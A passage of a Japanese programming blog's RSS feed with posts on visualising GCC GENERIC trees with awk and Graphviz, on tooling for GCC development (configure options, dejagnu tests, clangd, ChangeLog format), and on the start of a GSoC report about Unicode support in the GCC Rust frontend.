&lt;li&gt;lld&lt;/li&gt;
&lt;li&gt;mold&lt;/li&gt;
&lt;li&gt;IL Linker (.NETのリンカ)

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/dotnet/runtime/tree/main/src/tools/illink/src/linker&quot;&gt;https://github.com/dotnet/runtime/tree/main/src/tools/illink/src/linker&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/macOS&quot;&gt;macOS&lt;/a&gt;/&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/iOS&quot;&gt;iOS&lt;/a&gt;と&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/windows&quot;&gt;windows&lt;/a&gt;はどのリンカを使っているのだろうか?&lt;/p&gt;
</description>          <pubDate>Tue, 09 Jan 2024 19:13:10 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189073738109</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6801883189073738109/1704795190" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>GCCのGENERICを可視化する</title>
          <link>https://tamaron.hatenablog.com/entry/2023/12/31/020331</link>          <description>&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のGENERICを&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Graphviz&quot;&gt;Graphviz&lt;/a&gt;で可視化する。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://gist.github.com/tonyseek/4161012&quot;&gt;https://gist.github.com/tonyseek/4161012&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;からコードを拝借する。
以下のように3つファイルを作る。&lt;/p&gt;

&lt;p&gt;astviz:&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;#!/usr/bin/env sh
SCRIPT_PATH=$(dirname $0)
gcc -o $1 $1.c -fdump-tree-original-raw
$SCRIPT_PATH/pre.awk $1.c.* | $SCRIPT_PATH/treeviz.awk &amp;gt; $1.dot
dot -Tpng $1.dot -o $1.png&lt;/pre&gt;


&lt;p&gt;pre.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/awk&quot;&gt;awk&lt;/a&gt;:&lt;/p&gt;

&lt;pre class=&quot;code lang-awk&quot; data-lang=&quot;awk&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;#!/usr/bin/env -S gawk -f &lt;/span&gt;
&lt;span class=&quot;synConstant&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;[^&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;]/&lt;/span&gt;{
    &lt;span class=&quot;synIdentifier&quot;&gt;gsub&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;@/&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;~@&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;$0&lt;/span&gt;)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;synIdentifier&quot;&gt;gsub&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;/( &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;):( &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;)/&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;:&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;$0&lt;/span&gt;)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
}
&lt;/pre&gt;


&lt;p&gt;treeviz.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/awk&quot;&gt;awk&lt;/a&gt;&lt;/p&gt;

&lt;pre class=&quot;code lang-awk&quot; data-lang=&quot;awk&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;#!/usr/bin/env -S gawk -f&lt;/span&gt;
&lt;span class=&quot;synComment&quot;&gt;#http://alohakun.blog7.fc2.com/?mode=m&amp;amp;no=355&lt;/span&gt;
&lt;span class=&quot;synSpecial&quot;&gt;BEGIN&lt;/span&gt; {&lt;span class=&quot;synSpecial&quot;&gt;RS&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;~@&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;digraph G {&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; node [shape = record];&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;}
&lt;span class=&quot;synConstant&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;^&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;0-9&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;]/&lt;/span&gt;{
s &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;sprintf&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; [label = &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; | {&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;$1,&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;$1&lt;/span&gt;)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;synStatement&quot;&gt;for&lt;/span&gt;(i &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt; i &amp;lt; &lt;span class=&quot;synSpecial&quot;&gt;NF&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;synSpecial&quot;&gt;++&lt;/span&gt;)
    s &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;synIdentifier&quot;&gt;sprintf&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; | &amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; $i)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    s &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; s &lt;span class=&quot;synIdentifier&quot;&gt;sprintf&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;}}&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\&amp;quot;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;];&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; $i)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;synSpecial&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; s&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;while&lt;/span&gt; (&lt;span class=&quot;synConstant&quot;&gt;/([&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;a-zA-Z&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;):@([&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;0-9&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;)/&lt;/span&gt;){
        format &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;sprintf&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;1 &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;1 -&amp;gt; &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;2;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;$1&lt;/span&gt;)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;synSpecial&quot;&gt;$0&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;gensub&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;/([&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;a-zA-Z&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;):@([&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;0-9&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;.*&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; format&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;g&amp;quot;&lt;/span&gt;)&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    }&lt;span class=&quot;synSpecial&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;synStatement&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot; &lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;%s\n&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;synSpecial&quot;&gt;$0;&lt;/span&gt;
}
&lt;span class=&quot;synSpecial&quot;&gt;END&lt;/span&gt; {&lt;span class=&quot;synStatement&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;}&amp;quot;&lt;/span&gt;}
&lt;/pre&gt;




&lt;pre class=&quot;code lang-sh&quot; data-lang=&quot;sh&quot; data-unlink&gt;$ &lt;span class=&quot;synStatement&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; &lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;int main() { return 0; }&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt; &lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; a.c
$ ./astviz a
&lt;/pre&gt;


&lt;p&gt;a.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/png&quot;&gt;png&lt;/a&gt;
&lt;span itemscope itemtype=&quot;http://schema.org/Photograph&quot;&gt;&lt;img src=&quot;https://cdn-ak.f.st-hatena.com/images/fotolife/t/tamaroning/20231231/20231231020259.png&quot; width=&quot;1200&quot; height=&quot;307&quot; loading=&quot;lazy&quot; title=&quot;&quot; class=&quot;hatena-fotolife&quot; itemprop=&quot;image&quot;&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;できた。&lt;/p&gt;

&lt;p&gt;ちなみに、
astvizの最後の行を&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;$SCRIPT_PATH/pre.awk $1.c.* | $SCRIPT_PATH/treeviz.awk | dot -Tx11&lt;/pre&gt;


&lt;p&gt;にすれば中間ファイルを作らずにウィンドウ上にグラフを表示できて嬉しい。&lt;/p&gt;
</description>          <pubDate>Sun, 31 Dec 2023 02:03:31 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189071106503</guid>
          
          <enclosure url="https://cdn.image.st-hatena.com/image/scale/5c0d968649174710e61cf707e18bd5eb4e15d94e/backend=imagemagick;version=1;width=1300/https%3A%2F%2Fcdn-ak.f.st-hatena.com%2Fimages%2Ffotolife%2Ft%2Ftamaroning%2F20231231%2F20231231020259.png" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>GCC本体を快適に開発する</title>
          <link>https://tamaron.hatenablog.com/entry/2023/12/29/154532</link>          <description>&lt;h1 id=&quot;はじめに&quot;&gt;はじめに&lt;/h1&gt;

&lt;p&gt;言語問わず、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;と比べ&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;の貢献に関するドキュメントが少なく感じるので、メモ程度に残しておきます。&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のビルドの方法は色んなところに書いてあるので、そちらを参照してください。&lt;/p&gt;

&lt;p&gt;対象読者は以下のとおりです。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;を読みたい人&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;を改造したい人&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;に貢献したい人&lt;/li&gt;
&lt;/ul&gt;


&lt;h1 id=&quot;ビルド&quot;&gt;ビルド&lt;/h1&gt;

&lt;p&gt;&lt;code&gt;./gcc/configure&lt;/code&gt;でビルド&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D5%A5%A3%A5%AE%A5%E5%A5%EC%A1%BC%A5%B7%A5%E7%A5%F3&quot;&gt;コンフィギュレーション&lt;/a&gt;を実行します。典型的なオプションは以下の通り。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;--disable-bootstrap : &lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;のブートストラップを無効化&lt;/li&gt;
&lt;li&gt;--disable-multilib : 異なるABIなどをサポートするためのライブラリをビルドしないようにする&lt;/li&gt;
&lt;li&gt;--enable-languages=rust : ビルドする言語を選択する。この場合はRustを有効化&lt;/li&gt;
&lt;li&gt;--enable-checking=extra,gimple,tree,types : コード生成時のツリーのチェックを有効化&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;詳しくは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のHPを参照: &lt;a href=&quot;https://gcc.gnu.org/install/configure.html&quot;&gt;https://gcc.gnu.org/install/configure.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;make&lt;/code&gt;を実行する時は&lt;code&gt;-j($nproc)&lt;/code&gt;を渡しましょう。&lt;/p&gt;

&lt;h1 id=&quot;テスト&quot;&gt;テスト&lt;/h1&gt;

&lt;p&gt;End-to-endテストは&lt;code&gt;gcc/gcc/testsuite/{language}/&lt;/code&gt;以下にあります。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%C3%B1%C2%CE%A5%C6%A5%B9%A5%C8&quot;&gt;単体テスト&lt;/a&gt;(&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;ではselftestsと呼ばれる)は&lt;code&gt;gcc/gcc/{language}&lt;/code&gt;内にあります。&lt;/p&gt;

&lt;p&gt;End-to-endテストではdejagnuという&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D5%A5%EC%A1%BC%A5%E0%A5%EF%A1%BC%A5%AF&quot;&gt;フレームワーク&lt;/a&gt;が使われています。
言語処理系で典型的な、期待されるエラーやその内容、標準出力やプロセスの終了値をチェックできます。&lt;/p&gt;

&lt;p&gt;以下はC&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D7%A5%EA%A5%D7%A5%ED%A5%BB%A5%C3%A5%B5&quot;&gt;プリプロセッサ&lt;/a&gt;のテスト例(dejagnu)です。&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synComment&quot;&gt;/* PR preprocess/95183  */&lt;/span&gt;

&lt;span class=&quot;synComment&quot;&gt;/* { dg-do preprocess } */&lt;/span&gt;

&lt;span class=&quot;synPreProc&quot;&gt;#define &lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;(x) x&lt;/span&gt;

&lt;span class=&quot;synIdentifier&quot;&gt;f&lt;/span&gt;( &lt;span class=&quot;synComment&quot;&gt;/* { dg-error &amp;quot;-:unterminated&amp;quot; &amp;quot;unterminated macro&amp;quot; } */&lt;/span&gt;
&lt;/pre&gt;


&lt;h1 id=&quot;LSP&quot;&gt;LSP&lt;/h1&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;は&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/C%2B%2B&quot;&gt;C++&lt;/a&gt;で書かれています。
ある程度大きな&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;なので、LSPは&lt;a href=&quot;https://clangd.llvm.org/&quot;&gt;Clangd&lt;/a&gt;をつかうと速くて快適です。&lt;/p&gt;

&lt;p&gt;Clangdはビルド時の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;オプションを収集したcompile_commands.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/json&quot;&gt;json&lt;/a&gt;というファイルを認識してLSPとして動作します。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;はビルドシステムとして&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Makefile&quot;&gt;Makefile&lt;/a&gt;を使います。CMakeと異なり、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Makefile&quot;&gt;Makefile&lt;/a&gt;はcompile_commands.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/json&quot;&gt;json&lt;/a&gt;を生成してくれません。そこで、&lt;a href=&quot;https://github.com/rizsotto/Bear&quot;&gt;Bear&lt;/a&gt;というツール経由でmakeコマンドを呼び出すことでcompile_commands.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/json&quot;&gt;json&lt;/a&gt;を生成することができます。&lt;/p&gt;

&lt;pre class=&quot;code bash&quot; data-lang=&quot;bash&quot; data-unlink&gt;$ ls
gcc
$ mkdir gcc-build &amp;amp;&amp;amp; cd gcc-build
# ビルドのコンフィギュレーション
$ ../gcc/configure ...
...
# bear経由でビルドする
$ bear -- make -j($nproc) ...
...
# 生成されたcompile_commands.jsonをコピー
$ cp compile_commands.json ../gcc/compile_commands.json
&lt;/pre&gt;


&lt;p&gt;注意: 自分の環境ではmakeに&lt;code&gt;-j($nproc)&lt;/code&gt;を渡すとbearがcompile_commands.&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/json&quot;&gt;json&lt;/a&gt;を生成してくれませんでした。原因はよくわかりません。&lt;/p&gt;

&lt;h3 id=&quot;Clangdでシステムヘッダが見つからない場合&quot;&gt;Clangdでシステムヘッダが見つからない場合&lt;/h3&gt;

&lt;p&gt;clangdは&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%D2%A5%E5%A1%BC%A5%EA%A5%B9%A5%C6%A5%A3%A5%C3%A5%AF&quot;&gt;ヒューリスティック&lt;/a&gt;で&lt;code&gt;&amp;lt;string.h&amp;gt;&lt;/code&gt;などのヘッダーファイルを探すため、見つからないことがたまにあります。その場合は、&lt;code&gt;.clangd&lt;/code&gt;という名前のファイルを作り、以下のように適当にインクルードパスを指定すればよいです。&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;# .clangd
CompileFlags:
  Add: [
    &amp;#34;-I/usr/lib/gcc/x86_64-linux-gnu/11/include&amp;#34;,
    &amp;#34;-I/usr/include/x86_64-linux-gnu&amp;#34;,
    &amp;#34;-I/usr/include&amp;#34;,
    &amp;#34;-I/usr/include/c++/11&amp;#34;,
    &amp;#34;-I/usr/include/x86_64-linux-gnu/c++/11&amp;#34;,
    &amp;#34;-I/usr/include/c++/11/backward&amp;#34;
　　]
&lt;/pre&gt;


&lt;p&gt;参考: &lt;a href=&quot;https://stackoverflow.com/questions/17939930/finding-out-what-the-gcc-include-path-is&quot;&gt;https://stackoverflow.com/questions/17939930/finding-out-what-the-gcc-include-path-is&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;コミットログ&quot;&gt;コミットログ&lt;/h1&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;のコミットメッセージは定められたフォーマットに従う必要があります。
以下は実際のコミットメッセージです。(名前とメールは伏せました。)&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;gccrs: Refactor FnType deprecated API

gcc/rust/ChangeLog:

    * backend/rust-compile-expr.cc (CompileExpr::visit): Use new API.
    * typecheck/rust-tyty-call.cc (TypeCheckCallExpr::visit): Use new API.
    * typecheck/rust-tyty-cmp.h: Remove old API.
    * typecheck/rust-tyty.cc (FnPtr::is_equal): Use new API.
    * typecheck/rust-tyty.h: Remove old API.
    * typecheck/rust-unify.cc (UnifyRules::expect_fnptr): Use new API.

Signed-off-by: Name &amp;lt;Email&amp;gt;&lt;/pre&gt;


&lt;p&gt;このような&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/ChangeLog&quot;&gt;ChangeLog&lt;/a&gt;を自動的に生成するには&lt;code&gt;git gcc-commit-mklog&lt;/code&gt;コマンドを使います。
&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/gcc&quot;&gt;gcc&lt;/a&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8&quot;&gt;ディレクト&lt;/a&gt;リで&lt;code&gt;./contrib/gcc-git-customization.sh&lt;/code&gt;を実行することでインストールできます。&lt;/p&gt;

&lt;h1 id=&quot;おわりに&quot;&gt;おわりに&lt;/h1&gt;

&lt;p&gt;役に立てば幸いです！&lt;/p&gt;
</description>          <pubDate>Fri, 29 Dec 2023 15:45:32 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/6801883189070679015</guid>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/6801883189070679015/1703832537" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>GSoC(gcc Rust)の進捗報告</title>
          <link>https://tamaron.hatenablog.com/entry/2023/07/17/200702</link>          <description>&lt;p&gt;GSoC2023で&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt; Rustフロントエンドの&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/Unicode&quot;&gt;Unicode&lt;/a&gt;サポートに取り組んでいます。
先週、midterm eveluationが終わり、無事に通過することができました。&lt;/p&gt;

&lt;p&gt;この記事では、時系列順に取り組んだことと今後について説明します。&lt;/p&gt;

&lt;h2 id=&quot;現状&quot;&gt;現状&lt;/h2&gt;

&lt;p&gt;こんな感じで、&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;内で色々な文字を使うことができます。
識別子だけでなく、様々な空白や改行にも対応しています。
name mangingは未実装のため、非ASCII文字を名前に含む関数などのリンクには対応していません。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;Русский&lt;/span&gt;() {
  &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; 日本語 &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; ();
}
&lt;/pre&gt;


&lt;p&gt;目次の代わりにに進捗を列挙しておきます。&lt;/p&gt;

&lt;p&gt;これまでに取り組んだこと&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/UTF-8&quot;&gt;UTF-8&lt;/a&gt; 識別子の&lt;a class=&quot;keyword&quot; href=&quot;https://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ナイズ&lt;/li&gt;
